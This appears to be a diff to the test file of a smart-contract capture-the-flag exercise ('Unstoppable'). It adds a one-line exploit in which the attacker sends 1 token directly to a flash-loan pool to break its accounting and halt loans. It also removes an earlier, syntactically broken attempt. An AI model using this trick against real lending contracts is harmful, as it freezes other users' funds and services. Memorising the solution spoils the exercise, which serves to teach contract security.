@@ -33,15 +33,14 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker)
         ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);
 
-         // Show it's possible for anyone to take out a flash loan
-         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
-         await this.receiverContract.executeFlashLoan(10, { from: someUser });
+        // Show it's possible for anyone to take out a flash loan
+        this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
+        await this.receiverContract.executeFlashLoan(10, { from: someUser });
     });
 
     it('Exploit', async function () {
+        await this.token.connect(attacker).transfer(this.pool.address, 1)
         /** YOUR EXPLOIT GOES HERE */
-
-        await.this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE,{from: attacker,});
     });
 
     after(async function () {
